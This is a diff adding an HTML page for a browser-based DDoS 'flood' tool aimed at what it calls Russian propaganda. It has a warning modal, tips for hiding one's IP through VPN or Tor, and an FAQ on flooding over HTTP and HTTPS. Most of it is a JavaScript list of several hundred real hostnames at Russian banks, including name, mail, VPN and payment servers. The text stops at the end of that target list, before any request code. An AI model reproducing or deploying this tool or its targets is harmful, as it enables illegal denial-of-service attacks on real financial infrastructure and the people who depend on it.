@@ -1,0 +1,897 @@
+<!doctype html><head>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=1024">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Day 229 flood</title>
+<link href="https://www.helpukr.xyz/bootstrap.helpukr.css" rel="stylesheet" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+
+<style>
+/* width */
+::-webkit-scrollbar {
+  width: 10px;
+  overflow: auto;
+  height: 0em;
+}
+/* Track */
+::-webkit-scrollbar-track {
+  background: #34a8eb;
+}
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: #63c6ff
+  ;
+}
+/* Handle on hover */
+::-webkit-scrollbar-thumb:hover {
+  background: yellow;
+}
+.style10 {
+	font-size: 9px;
+	color: #FFFFFF;
+}
+</style>
+	<script> 
+		/* This method uses ipify's api to get the clients IP Address. 
+		This method is completely free and no limitations of use. */ 
+		$.getJSON("https://api.ipify.org?format=json", 
+										function(data) { 
+			// userip element is where the IP will be displayed
+			$("#userip").html(data.ip); 
+		}) 
+	</script>
+	<style> 
+		h6 {
+		color:white;
+		}
+	</style>
+    <style>
+        body {
+            padding: 0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFD600;
+        }
+        .title {
+            margin: 3rem auto 3rem auto;
+            text-align: center;
+            color: #005BBC;
+        }
+        .intro .howto {
+            background-color: #005BBC;
+        }
+        .intro .howto h3 {
+            color: #FFD600;
+            text-align: center;
+            margin-top: 1rem;
+        }
+        .intro .howto p {
+            color: white;
+            text-align: justify;
+        }
+
+        .footer {
+    color: #005BBC;
+    margin-top: 2rem;
+    text-align: center;
+        }
+        .desc{
+            color:black;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+            margin: 0 auto;
+            width: 60%;
+        }
+        .desc h3 {
+            text-align: center;
+            color: #005BBC;
+        }
+        #stats h4 {
+            font-size: 1.1em;
+            text-decoration: underline;
+            color: #005BBC;
+            font-weight: 400;
+        }
+        table.status {
+            margin-bottom: 10px;
+        }
+    .style1 {
+	color: #CC0000;
+	font-weight: bold;
+}
+.style6 {color: #FF6262}
+    .style7 {font-size: 0.1px}
+    .style9 {
+	color: #FFD600;
+	font-weight: bold;
+	font-size: 18px;
+}
+    .style10 {font-size: 24px}
+    .style11 {
+	font-size: 16px;
+	color: #FFFFFF;
+} 
+    .style13 {
+	margin: 3rem auto 3rem auto;
+	text-align: center;
+	color: #FFD600;
+	font-size: 24px;
+	font-weight: bold;
+}
+    .style14 {color: #FFFFFF}
+    .style15 {color: #FFFF00}
+    .style16 {color: #FF3300}
+    .style17 {color: #FF6633}
+.style21 {color: #B9DCFF}
+    .style22 {color: #ECE3AA}
+	table {
+  border-color: #fffd9c;
+}
+</style>
+<body>
+    <div class="modal" id="HelpUKR-WarningBox" tabindex="-1" role="dialog" aria-labelledby="HelpUKR-WarningBoxLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content">
+    <div class="modal-header" style=" padding-bottom: 4px; padding-top: 3px;padding-left: 3px;">
+    <h5 id="HelpUKR-WarningBoxLabel" style=" margin-bottom: 0px;">
+	<span class="modal-title style1"><img class="qIBnUc" src="https://i.imgur.com/hwWmsDc.png" draggable="false" width="50px" alt="UKR"> Warning: </span><span class="modal-title style6">Read before you continue.&nbsp;<span class="style16"><i>[</span><span class="style17"><b>Day 229</span></b><span class="style16">]</i></span></span></h5></div>
+    <div class="modal-body" style=" padding-top: 5px; padding-bottom: 0px;">
+    <p style=" margin-bottom: 0px;">As you're likely already aware, the action of DoSing or participating in DDoS is illegal, and for good reason.
+Click on continue if you have a VPN Enabled, use a proxy, use the Tor browser or have your own secure connection and wish to support Ukraine in taking down Russian propaganda.</p>
+    <hr style=" margin-top: 5px; margin-bottom: 5px;">
+    <p>This works by sending GET requests to each targeted website.<br>
+       It’s like opening each website at once on your PC and<br>
+      re-requesting the data over and over, although the data is not saved or cached, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its best to stay safe.</p></div>
+    <div class="modal-footer">
+    <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.helpukr.xyz'">Leave</button>
+    <button type="button" class="btn btn-primary" data-dismiss="HelpUKR-WarningBoxLabel" onClick="togglePause(); myModal.toggle();">Continue</button></div></div></div></div>
+    <table width="100%" border="0" align="center" bgcolor="#005BBC">
+      <tr>
+        <td bgcolor="#004A9D"><div align="center">
+          <table width="200" border="1" style="border-top-width: 0px;">
+              <tbody><tr>
+                <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                  <tbody>
+                    <tr>
+                      <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong> Info:</strong> Your Public IP Address is: </span></div></td>
+                      <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                      <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span> <a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a> &nbsp; </div></td>
+                    </tr>
+                  </tbody>
+                </table></td>
+              </tr>
+            </tbody></table>
+          <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">Propaganda http(s) flood for <span class="style15">Day 229 </span>using targets from the IT Army of Ukraine.</p>
+        </div></td>
+      </tr><tr>
+        <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+          <h3><u>Information about this tool.</u></h3>
+        </div></td>
+      </tr><tr>
+        <td><table width="90%" border="0" align="center">
+          <tr>
+            <td align="center"><p class="style11">This tool is hosted via <a href="https://pages.github.com/" target="_blank" class="align-content-sm-between"><a href="https://pages.github.com/" target="_blank" class="style15">GitHub Page</a>, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day229.htm" target="_blank" class="style15">here</a>. A new page will be added for each day, with a new set of targets from the Ukrainian IT Army's telegram servers.</p>
+              <p class="style11">All of the news in the Russian federation is fake and need to be shut down, we need as many people as possible to help. Just a tiny 1kbps of data could be the edge needed to take down a server hosting propaganda.<br>
+                <br>Just open this page and leave it running on your devices as long as possible, it will flood targets selected specifically for that day.<br>
+                Targets are chosen by an intelligence team who are always looking at what services are aiding Russia’s war,together we can pose a huge load on their infrastructure.</p>
+          <details>
+			  <summary><span style="color: #ffff99;">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></span></summary>
+              <p><table width="100%" border="0">
+                <tbody><tr>   
+                  <td><hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"><p class="style11">FAQ:<br>
+                    <span style="color: #ffff99;"><strong>Q)</strong></span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what i try?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> How can I see what's happening in more detail?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> 
+                      open the developer console by pressing F12 and select the Network Tab.<br>
+                      If you're on a mac you can't use F12 for this, instead right click anywhere on the site and click inspect, then click the network tab</p>
+                    <p class="style11" style="margin-bottom: 0px;"><span style="color: #ffff99;"><strong>Q)</strong></span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This happens because everything that happens is logged by the browser, but you can stop it pretty easily.<br>
+                      In the Network tab on the developer console (F12), press both the red button and the stop symbol.</p>
+                    <details style="margin-bottom: 16px;">
+                      <summary><span style="color: #ffff99;">Click Here to see Example</span></summary>
+                      <img src="https://i.imgur.com/5Cw6kai.png" draggable="false"> </details>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> Why are some of the requests having the same number error after a while?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests.<br>Also if you’re are using https:// in the address bar that would cause the http:// addresses to do the same</p></td>
+                    </tr>
+                </tbody>
+            </table></p>
+          </details>
+            <hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"></td>
+          </tr>
+        </table>
+          <table width="613" border="0" align="center">
+            <tr>
+              <td width="607"><h3 align="center" class="style14">Session Status</h3>
+                <p align="center" class="style14" style=" margin-bottom: 0px; padding-bottom: 2px;">Below is a log of sites that ether responded with errors or failed to respond at all.<br>
+                  It’s normal for this number to count up slow or fast and can often change.<br>
+                  If a lot of services are overloaded the numbers will go fast, else they’ll go slower.<br>
+                  If all requests are the same as all errors on some sites, it most likely means that the<br>
+                  site operator has banned the IP you’re using.</p>
+              </td>
+            </tr>
+          </table>
+	    </td>
+      </tr>
+    </table>
+<div class="desc text-center" style=" padding-top: 4px;">
+  <p align="center" class="style7" style=" margin-bottom: 0px;">Total number of requests: <span id="totalrequests">0</span></p>
+  <p>So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
+<button type="button" class="btn btn-primary" onClick="togglePause();" style=" padding-left: 32px; padding-right: 32px; padding-top: 8px; padding-bottom: 8px;">Resume</button></div>
+<div id="stats" class="container">
+  <div class="row">
+  </div>
+</div>
+<p class="footer">This website is an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.<br>
+      For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.<br>
+      It can even be used via the browser app on a Smart TV in the background whilst you watch TV.<br>
+      With your help you can convince a Russian to rebel agents the war by making them<br>
+      look elsewhere for news, remember, Nothing you do is too little!<br>
+      Glory to Ukraine, Glory to the hero’s.<br><br>
+	  <center>
+	    <div id="betabox" style="text-align: center"><span class="footer"><strong><span style="color:#3E7EFF"><em><u>Beta</u>:</em></span></strong> Estimated data requested from servers via GET: <span class="number-counter" data-count-from="0" data-count-to="1000000000000" data-count-speed="0.02">0</span>MB (MegaBytes)</span></div></center>
+<style>#betabox {
+  padding: 1px ;
+  border-top: 1px solid #3498db;
+  border-right: 1px solid #3498db;
+  background-color: #FFE248;
+  line-height: 110%;
+  border-left: 1px solid #3498db;
+  align-content: center;
+  align-self: 4px ;
+  width: 570px ;
+}</style>
+<script>
+        // target list
+        var urls = [
+        //We are switching to state-owned banks of the russian federation, which have already been attacked before.
+            'https://vtb.ru',
+            'https://www.vtb.ru',
+            'https://pay.vtb.ru',
+            'https://wificert.vtb.ru',
+            'https://ipoteka-online.vtb.ru',
+            'https://ns1.ilb.vtb.ru',
+            'https://ns2.ilb.vtb.ru',
+            'https://ns2.bsslb.vtb.ru',
+            'https://ilbb-ns1.vtb.ru',
+            'https://ilbb-ns2.vtb.ru',
+            'https://ns1.vtb.ru',
+            'https://ns2.vtb.ru',
+            'https://ns3.vtb.ru	',
+            'https://ns4.vtb.ru',
+            'https://ns5.vtb.ru',
+            'https://ns6.vtb.ru',
+            'https://ns7.vtb.ru',
+            'https://ns8.vtb.ru',
+            'https://sharing.vtb.ru',
+            'https://ivpn.vtb.ru',
+            'https://bank-accounts.vtb.ru',
+            'https://www.reg.vtb.ru',
+            'https://mvp.api.vtb.ru',
+            'https://www.online.vtb.ru',
+            'https://mx202.vtb.ru',
+            'https://www.mx201.vtb.ru',
+            'https://mx-srv.kursk.vtb.ru',
+            'https://mx2.vtb.ru',
+            'https://mx-srv1.kursk.vtb.ru',
+            'https://www.mx101.vtb.ru',
+            'https://mx102.vtb.ru',
+            'https://www.mx202.vtb.ru',
+            'https://mobi-da.vtb.ru',
+            'https://mobi-rr.vtb.ru',
+            'https://mobi-vpn-da.vtb.ru',
+            'https://wimapi.vtb.ru',
+            'https://troika.transport.vtb.ru',
+            'https://access.vtb.ru',
+            'https://api.vtb.ru',
+            'https://auth.lk.vtb.ru',
+            'https://marketplace.vtb.ru',
+            'https://pop3.dbo.vtb.ru',
+            'https://preprod.vtb.ru',
+            'https://vb.ilb.vtb.ru',
+            'https://mobile.broker.vtb.ru',
+            'https://osago.vtb.ru',
+            'https://mdmmi201lv.vtb.ru',
+            'https://sso-app2.vtb.ru',
+            'https://epa.api.vtb.ru',
+            'https://transport.vtb.ru',
+            'https://wifi.vtb.ru',
+            'https://service3.lkbo.vtb.ru',
+            'https://quikm.vtb.ru',
+            'https://async-online.vtb.ru',
+            'https://identity.dam.vtb.ru',
+            'https://mail.vla.vtb.ru',
+            'https://send.vtb.ru',
+            'https://presentation.vtb.ru',
+            'https://online-alpha.vtb.ru',
+            'https://service1.lkbo.vtb.ru',
+            'https://service2.lkbo.vtb.ru',
+            'https://digital.vtb.ru',
+            'https://mc.vtb.ru',
+            'https://admin.vmeste.vtb.ru',
+            'https://passport.api.vtb.ru',
+            'https://ae.transport.vtb.ru',
+            'https://headless-cms.vtb.ru',
+            'https://smtp.ilb.dbo.vtb.ru',
+            'https://smtp.dbo.vtb.ru',
+            'https://marketplace.vtb.ru',
+            'https://perevodworld.vtb.ru',
+            'https://team.vtb.ru',
+            'https://mail1.penza.vtb.ru',
+            'https://remote.vtb.ru',
+            'https://sip.msk.vtb.ru',
+            'https://autodiscover.vtb.ru',
+            'https://admin.transport.vtb.ru',
+            'https://sso-app.vtb.ru',
+            'https://zakryt-ip.vtb.ru',
+            'https://smtp1.dbo.vtb.ru',
+            'https://mail.tmn.vtb.ru',
+            'https://developers.vtb.ru',
+            'https://appweb.broker.vtb.ru',
+            'https://mydevices.vtb.ru',
+            'https://async-private.vtb.ru',
+            'https://passport.api.vtb.ru',
+            'https://push-server.vtb.ru',
+            'https://traveling-routes.vtb.ru	',
+            'https://business-kit.vtb.ru	',
+            'https://www.3ds.vtb.ru',
+            'https://headless-cms.vtb.ru',
+            'https://cvpn.vtb.ru',
+            'https://open.api.vtb.ru',
+            'https://sberbank.ru',
+            'https://scr.online.sberbank.ru',
+            'https://onlineoffice.sberbank.ru',
+            'https://myoffice.sberbank.ru',
+            'https://office.sberbank.ru',
+            'https://smartoffice.sberbank.ru',
+            'https://node2.online.sberbank.ru',
+            'https://va-node2.online.sberbank.ru',
+            'https://geo-t.geoapi.sberbank.ru',
+            'https://res-investor-psi.sberbank.ru',
+            'https://cms-res.online.sberbank.ru',
+            'https://front.node1.online.sberbank.ru',
+            'https://join.sberbank.ru',
+            'https://api.irm.sberbank.ru',
+            'https://smspking.sberbank.ru',
+            'https://files.sberstore.sberbank.ru',
+            'https://beta.sberbank.ru',
+            'https://va-node5.online.sberbank.ru',
+            'https://cobra.sberbank.ru',
+            'https://trading.sberbank.ru',
+            'https://sandbox-office.sberbank.ru',
+            'https://stage.online.sberbank.ru',
+            'https://id.sberbank.ru',
+            'https://online.sberbank.ru',
+            'https://file-upload-nodegf.online.sberbank.ru',
+            'https://ns1.sberbank.ru',
+            'https://ns2.sberbank.ru',
+            'https://ns3.sberbank.ru',
+            'https://ns4.sberbank.ru',
+            'https://id.sberbank-ru.os-psi.sberbank.ru',
+            'https://apimw.otp.sberbank.ru',
+            'https://pfm-stat.online.sberbank.ru',
+            'https://dialog.sberbank.ru',
+            'https://kasko.sberbank.ru',
+            'https://messenger.sberbank.ru',
+            'https://api.apps.sberbank.ru	',
+            'https://apps.sberbank.ru',
+            'https://dms.sberbank.ru',
+            'https://sbercontact.sberbank.ru',
+            'https://videomessage.sberbank.ru',
+            'https://geo1.online.sberbank.ru',
+            'https://sberstore.sberbank.ru',
+            'https://api.sberstore.sberbank.ru',
+            'https://cdn-investor.sberbank.ru',
+            'https://sbc01.sbercontact.sberbank.ru',
+            'https://files.apps.sberbank.ru',
+            'https://apps.sberbank.ru',
+            'https://dialog.sberbank.ru',
+            'https://csradar.sberbank.ru',
+            'https://sbmpsi.sberbank.ru',
+            'https://outlook.sberbank.ru',
+            'https://ip.dms.sberbank.ru',
+            'https://email1.sberbank.ru',
+            'https://email2.sberbank.ru',
+            'https://email3.sberbank.ru',
+            'https://ravpn2.sberbank.ru',
+            'https://svi.online.sberbank.ru',
+            'https://bfd.sberbank.ru',
+            'https://dss-ok.sberbank.ru',
+            'https://wso.sberbank.ru',
+            'https://sus.sberbank.ru',
+            'https://cert.sberbank.ru',
+            'https://vps.online.sberbank.ru',
+            'https://cms-res-investor.sberbank.ru',
+            'https://csc.sberbank.ru',
+            'https://mobile.sberbank.ru',
+            'https://api.otp.sberbank.ru',
+            'https://otp.sberbank.ru',
+            'https://ufscs.sberbank.ru',
+            'https://file-upload-node1.online.sberbank.ru',
+            'https://file-upload-node2.online.sberbank.ru',
+            'https://file-upload-node3.online.sberbank.ru',
+            'https://file-upload-node4.online.sberbank.ru',
+            'https://file-upload-node5.online.sberbank.ru',
+            'https://file-upload-node6.online.sberbank.ru',
+            'https://file-upload-node7.online.sberbank.ru',
+            'https://email1.sberbank.ru	',
+            'https://email2.sberbank.ru	',
+            'https://email3.sberbank.ru	',
+            'https://email4.sberbank.ru	',
+            'https://email5.sberbank.ru	',
+            'https://email6.sberbank.ru	',
+            'https://email7.sberbank.ru	',
+            'https://email8.sberbank.ru	',
+            'https://email9.sberbank.ru	',
+            'https://email0.sberbank.ru	',
+            'https://email11.sberbank.ru	',
+            'https://oprosso.sberbank.ru',
+            'https://sberalisa.sberbank.ru',
+            'https://securepayments.sberbank.ru',
+            'https://sberbank-ru.os-psi.sberbank.ru',
+            'https://files.otp.sberbank.ru',
+            'https://legacy.sberbank.ru',
+            'https://data.sberbank.ru',
+            'https://owapp.sberbank.ru',
+            'https://sberdisk.sberbank.ru',
+            'https://sprinter.sberbank.ru',
+            'https://ssl.sberbank.ru',
+            'https://guest-wifi.sberbank.ru',
+            'https://cdn.sberbank.ru',
+            'https://vpn.sberbank.ru',
+            'https://jazz.sberbank.ru',
+            'https://rshb.ru',
+            'https://ns1.online.rshb.ru',
+            'https://ns2.online.rshb.ru',
+            'https://ns1.business.rshb.ru',
+            'https://ns2.business.rshb.ru',
+            'https://ns1.broker.rshb.ru',
+            'https://ns2.broker.rshb.ru',
+            'https://ns1.next.rshb.ru',
+            'https://ns2.next.rshb.ru',
+            'https://ns1.www.rshb.ru',
+            'https://ns2.www.rshb.ru',
+            'https://ns1.quik.rshb.ru',
+            'https://ns2.quik.rshb.ru',
+            'https://mx1.rshb.ru',
+            'https://mx2.rshb.ru',
+            'https://s5900-lt01.rshb.ru',
+            'https://www.wifi-auth.rshb.ru',
+            'https://wifi-auth.rshb.ru',
+            'https://www.mx1.rshb.ru',
+            'https://www.mx2.rshb.ru',
+            'https://business.rshb.ru',
+            'https://ssl.rshb.ru',
+            'https://s3500-lt01.spb.rshb.ru',
+            'https://s6400-lt01.tomsk.rshb.ru',
+            'https://join.rshb.ru',
+            'https://smx.rshb.ru',
+            'https://vts1.rshb.ru',
+            'https://vts2.rshb.ru',
+            'https://reg.rshb.ru',
+            'https://online.rshb.ru',
+            'https://vks.rshb.ru',
+            'https://collab-edge.rshb.ru',
+            'https://s5800-lt01.ryazan.rshb.ru',
+            'https://s6900-lt01.bryansk.rshb.ru',
+            'https://s6200-lt01.bash.rshb.ru',
+            'https://root.quik.rshb.ru',
+            'https://ssl.rshb.ru',
+            'https://smx.rshb.ru',
+            'https://sgo-ap442.rshb.ru',
+            'https://sgo-lt04.rshb.ru',
+            'https://s5100-lt01.kostroma.rshb.ru	',
+            'https://s6800-lt02.pskov.rshb.ru',
+            'https://s1800-lt01.altay.rshb.ru',
+            'https://sgo-b2b1.vks.rshb.ru',
+            'https://retail.rshb.ru',
+            'https://s4600-lt01.volg.rshb.ru',
+            'https://dbo.rshb.ru',
+            'https://bc.chukotka.rshb.ru',
+            'https://m.rshb.ru',
+            'https://plc.rshb.ru',
+            'https://infoservice.rshb.ru',
+            'https://ca2.rshb.ru',
+            'https://s4900-lt01.krsn.rshb.ru',
+            'https://apespp.rshb.ru',
+            'https://ra.rshb.ru',
+            'https://sgo-ap482.rshb.ru',
+            'https://s3000-lt01.belg.rshb.ru',
+            'https://sgo-ns04.rshb.ru',
+            'https://s5400-lt01.primor.rshb.ru',
+            'https://www.finradar.rshb.ru	',
+            'https://network.rshb.ru',
+            'https://sgo-ns02.rshb.ru',
+            'https://sgo-lt11.rshb.ru',
+            'https://sgo-uc-expe22.rshb.ru',
+            'https://sgo-uc-expe11.rshb.ru',
+            'https://sgo-ap481.rshb.ru',
+            'https://ryazansrv.ryazan.rshb.ru',
+            'https://s7500-lt01.hab.rshb.ru',
+            'https://s0200-lt01.tambov.rshb.ru',
+            'https://gazprombank.ru',
+            'https://cdn.gbo.gazprombank.ru',
+            'https://service.gazprombank.ru',
+            'https://acs.gazprombank.ru',
+            'https://bsbp.gazprombank.ru',
+            'https://disk.gazprombank.ru',
+            'https://omsk.gazprombank.ru',
+            'https://exp-edge1.gazprombank.ru',
+            'https://k-accounts.gazprombank.ru',
+            'https://mapi.gazprombank.ru',
+            'https://developers.gazprombank.ru',
+            'https://bc.gazprombank.ru',
+            'https://mx1.gazprombank.ru',
+            'https://mx2.gazprombank.ru',
+            'https://mx3.gazprombank.ru',
+            'https://uk.gazprombank.ru',
+            'https://ns1.gazprombank.ru',
+            'https://ns2.gazprombank.ru',
+            'https://ns3.gazprombank.ru',
+            'https://ns4.gazprombank.ru',
+            'https://ns5.gazprombank.ru',
+            'https://admin.gazprombank.ru',
+            'https://p2p.gazprombank.ru',
+            'https://mapi.gazprombank.ru',
+            'https://space.gazprombank.ru',
+            'https://sna1.gazprombank.ru',
+            'https://online.gazprombank.ru',
+            'https://authvip.gazprombank.ru',
+            'https://api.gazprombank.ru',
+            'https://dmz.gazprombank.ru',
+            'https://bs.gazprombank.ru',
+            'https://sp-msk51-ise-psn3.net.gazprombank.ru',
+            'https://www1.gazprombank.ru',
+            'https://passport.gbo.gazprombank.ru',
+            'https://api.pps.gazprombank.ru',
+            'https://www.cdn.gbo.gazprombank.ru',
+            'https://pps.gazprombank.ru',
+            'https://mra.gazprombank.ru',
+            'https://mx110.gazprombank.ru	',
+            'https://mx30.gazprombank.ru',
+            'https://3ds.gazprombank.ru',
+            'https://mx120.gazprombank.ru',
+            'https://sop.gazprombank.ru',
+            'https://sips.gazprombank.ru',
+            'https://www2.gazprombank.ru',
+            'https://am.gazprombank.ru',
+            'https://mx20.gazprombank.ru',
+            'https://mx.gazprombank.ru',
+            'https://mo.gazprombank.ru',
+            'https://vts.gazprombank.ru',
+            'https://mx40.gazprombank.ru',
+            'https://sp-msk50-ise-psn3.net.gazprombank.ru',
+            'https://authweb.gazprombank.ru',
+            'https://mx10.gazprombank.ru',
+            'https://mx5.gazprombank.ru',
+            'https://mail.gazprombank.ru',
+            'https://webmail.gazprombank.ru',
+            'https://www.gazprombank.ru',
+            'https://acs.gazprombank.ru',
+            'https://ns.gazprombank.ru',
+            'https://44.gazprombank.ru',
+            'https://mail.mob.gazprombank.ru',
+            'https://sbp.gazprombank.ru',
+            'https://service.gazprombank.ru',
+            'https://alfabank.ru',
+            'https://gw-alfa-rzd.alfabank.ru',
+            'https://crm.alfabank.ru',
+            'https://cms.alfabank.ru',
+            'https://idea.alfabank.ru',
+            'https://message.alfabank.ru',
+            'https://cl.dm.alfabank.ru',
+            'https://dm.alfabank.ru',
+            'https://smpapi.alfabank.ru',
+            'https://vts.alfabank.ru',
+            'https://abm.alfabank.ru',
+            'https://smpcc.alfabank.ru',
+            'https://onlc.alfabank.ru',
+            'https://vcs.alfabank.ru',
+            'https://www.indeed2fapush.alfabank.ru',
+            'https://mypc.alfabank.ru',
+            'https://video.alfabank.ru',
+            'https://portal.connectra.alfabank.ru',
+            'https://maildigital.alfabank.ru',
+            'https://sap.alfabank.ru',
+            'https://settings.alfabank.ru',
+            'https://news.alfabank.ru',
+            'https://ibank.alfabank.ru',
+            'https://factoring.alfabank.ru',
+            'https://apiws.alfabank.ru',
+            'https://auth.alfabank.ru',
+            'https://ecom.alfabank.ru',
+            'https://owa.alfabank.ru',
+            'https://m.alfabank.ru',
+            'https://xplatform.alfabank.ru',
+            'https://store.alfabank.ru',
+            'https://store.alfabank.ru',
+            'https://messagex5.alfabank.ru',
+            'https://r2d2.alfabank.ru',
+            'https://mx1.travel.alfabank.ru',
+            'https://mx2.travel.alfabank.ru',
+            'https://business.auth.alfabank.ru',
+            'https://owa-vip.alfabank.ru',
+            'https://owa-vips.alfabank.ru',
+            'https://pilots.alfabank.ru',
+            'https://cvc.alfabank.ru',
+            'https://atlas.alfabank.ru',
+            'https://oauthap.alfabank.ru',
+            'https://3dsserver.alfabank.ru',
+            'https://atv.alfabank.ru',
+            'https://anyway.alfabank.ru',
+            'https://autocredit.alfabank.ru',
+            'https://mail1.alfabank.ru',
+            'https://api.ipoteka.alfabank.ru',
+            'https://ic2.alfabank.ru',
+            'https://uapi.alfabank.ru',
+            'https://payment.alfabank.ru',
+            'https://alfa-mobile.alfabank.ru',
+            'https://www.internet.alfabank.ru',
+            'https://c34uh42ce5kli-rqwdps08cd8mexs1zejmc.connectra.alfabank.ru',
+            'https://zp-auth.alfabank.ru',
+            'https://pay2.alfabank.ru',
+            'https://ws1-yaapi-pp0-01.alfabank.ru',
+            'https://cit.alfabank.ru',
+            'https://mdm.alfabank.ru',
+            'https://auth.alfabank.ru',
+            'https://client.alfabank.ru',
+            'https://reg.alfabank.ru',
+            'https://email.reg.alfabank.ru',
+            'https://13.alfabank.ru',
+            'https://digital.alfabank.ru',
+            'https://autocredits.alfabank.ru',
+            'https://online.alfabank.ru',
+            'https://json.alfabank.ru',
+            'https://pay.alfabank.ru',
+            'https://owas.alfabank.ru',
+            'https://apapi.alfabank.ru',
+            'https://api.alfabank.ru',
+            'https://internet.alfabank.ru',
+            'https://web.alfabank.ru',
+            'https://oauthas.alfabank.ru',
+            'https://svb.alfabank.ru',
+            'https://money.alfabank.ru',
+            'https://my.alfabank.ru',
+            'https://job.alfabank.ru',
+            'https://dev.alfabank.ru',
+            'https://sip.alfabank.ru',
+            'https://id.alfabank.ru',
+            'https://gw-alfa-m10.alfabank.ru',
+            'https://cisco-ise.alfabank.ru',
+            'https://psbank.ru',
+            'https://vp.psbank.ru',
+            'https://monoapp.psbank.ru',
+            'https://f1.psbank.ru',
+            'https://ns1.psbank.ru	',
+            'https://ns2.psbank.ru	',
+            'https://ns3.psbank.ru',
+            'https://ns4.psbank.ru',
+            'https://mx1.psbank.ru',
+            'https://mx2.psbank.ru',
+            'https://cloud.psbank.ru',
+            'https://goszakupki.psbank.ru',
+            'https://izhevskmx.psbank.ru',
+            'https://vseprosto.psbank.ru',
+            'https://f1s.psbank.ru',
+            'https://lk.psbank.ru',
+            'https://pskov.psbank.ru',
+            'https://corporate.psbank.ru',
+            'https://stavropolmx.psbank.ru',
+            'https://nskmx.psbank.ru',
+            'https://async.mdm.psbank.ru',
+            'https://kirovmx.psbank.ru',
+            'https://ftp.psbank.ru	',
+            'https://saprouter.psbank.ru',
+            'https://mm.psbank.ru',
+            'https://samara.psbank.ru',
+            'https://ns1.vladimir.psbank.ru',
+            'https://spbmx.spb.psbank.ru',
+            'https://samaramx.psbank.ru',
+            'https://lk.psbank.ru',
+            'https://lyncwebapps.psbank.ru',
+            'https://mydsstst.psbank.ru',
+            'https://ryazan.psbank.ru',
+            'https://kazan.psbank.ru',
+            'https://h2h.psbank.ru',
+            'https://ryazanmx.psbank.ru',
+            'https://best-tax.psbank.ru',
+            'https://intpsb1c.psbank.ru',
+            'https://yaroslavlmx.psbank.ru',
+            'https://bryanskmx.psbank.ru',
+            'https://vladikmx.psbank.ru',
+            'https://abakanmx.psbank.ru',
+            'https://mmail.psbank.ru',
+            'https://ib.psbank.ru',
+            'https://rostovmx.psbank.ru',
+            'https://pskovmx.psbank.ru',
+            'https://enigma1.psbank.ru',
+            'https://wbx.psbank.ru',
+            'https://lp.psbank.ru',
+            'https://chat.psbank.ru',
+            'https://belgorodmx.psbank.ru',
+            'https://mailr2.psbank.ru',
+            'https://chatdev.psbank.ru',
+            'https://permmx.psbank.ru',
+            'https://vladimir.psbank.ru',
+            'https://admin.lk.psbank.ru',
+            'https://mdm.psbank.ru',
+            'https://tambovmx.psbank.ru',
+            'https://nnovgorodmx.psbank.ru',
+            'https://mycard.psbank.ru',
+            'https://api.lk.psbank.ru',
+            'https://api.svm.psbank.ru',
+            'https://mailr1.psbank.ru',
+            'https://pfm.psbank.ru',
+            'https://ufamx.psbank.ru',
+            'https://spbmx2.psbank.ru',
+            'https://volgogradmx.psbank.ru',
+            'https://irkutskmx.psbank.ru',
+            'https://interweb.psbank.ru',
+            'https://mx.psbank.ru',
+            'https://spbmx.psbank.ru',
+            'https://wizard.psbank.ru',
+            'https://mydss.psbank.ru',
+            'https://msb3.psbank.ru',
+            'https://ivanovomx.psbank.ru',
+            'https://invoice.psbank.ru',
+            'https://fw.psbank.ru',
+            'https://cdn.psbank.ru',
+            'https://saratovmx.psbank.ru',
+            'https://smolenskmx.psbank.ru',
+            'https://voronezhmx.psbank.ru',
+            'https://chat.psbank.ru',
+            'https://gateway.chat.psbank.ru',
+            'https://ib2.psbank.ru',
+            'https://mailx5.psbank.ru',
+            'https://mailx6.psbank.ru',
+            'https://ns4.psbank.ru',
+            'https://maas-gw.psbank.ru',
+            'https://krasnodarmx.psbank.ru',
+            'https://store.psbank.ru',
+            'https://av.psbank.ru',
+            'https://office.psbank.ru',
+            'https://business.psbank.ru',
+        ];
